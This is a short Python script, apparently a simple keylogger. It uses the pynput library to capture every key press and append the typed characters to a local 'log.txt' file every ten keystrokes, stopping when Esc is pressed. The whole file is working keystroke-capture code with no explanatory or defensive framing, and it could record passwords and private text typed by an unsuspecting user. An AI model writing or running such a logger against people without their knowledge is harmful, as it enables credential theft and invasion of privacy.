import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if key == Key.esc:
        write_file(keys)
        return False

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
